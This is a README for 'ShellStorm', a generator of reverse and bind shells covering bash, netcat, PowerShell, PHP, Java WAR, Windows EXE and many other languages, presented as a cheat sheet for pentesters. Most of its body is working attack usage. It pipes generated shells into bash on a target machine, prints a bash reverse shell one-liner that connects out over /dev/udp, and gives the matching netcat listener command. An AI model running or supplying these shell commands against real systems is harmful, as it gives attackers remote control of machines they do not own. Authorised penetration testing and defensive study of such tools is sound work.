# ShellStorm
Automatic reverse/bind shell generator cheat sheet.  

A compilation of knowledge over the years from many pentesters that you will recognize  
after reading the source code to make the process of creating reverse and bind connections easier  
for cybersecurity analysts.  

<!--![alt text](https://github.com/0bfxgh0st/ShellStorm/blob/main/screenshots/Shellstorm.gif)-->

* Install requirements for generate **WAR** packages & **EXE** files.  
```
sudo apt-get update -y && sudo apt-get install default-jdk mingw-w64 -y
```

## Available languages/programs  
<pre>
asp
awk
bash
cpan
dart
elf
exe
gawk
golang
groovy
java
jsp
lua
nc
nc-nef (netcat without -e flag, mkfifo)
nodejs
openssl
perl
php
php-daemon
php-simple
ps1
ps1-ds (powershell download string)
python
ruby
rust
sbd
socat
telnet
war
</pre>

# TL;DR
## Try go further
* In some cases you can download shellstorm in any 'target' machine with Linux kernel (or WSL) and execute it by piping it if you prefer.  
<pre>
bash shellstorm.sh bash 10.2.54.13 1337 | bash
</pre>

* Do you want UDP shell? No problem, 'sed' it.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g'
Output:
bash -c "bash -i >& /dev/udp/127.0.0.1/1337 0>&1"
</pre>

* You can pipe it too.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g' | bash
Note:  
Remember use -u (udp) flag in netcat listener as following:  
nc -u -lvp 1337
</pre>

### Some relevant sources:  
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>  
<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
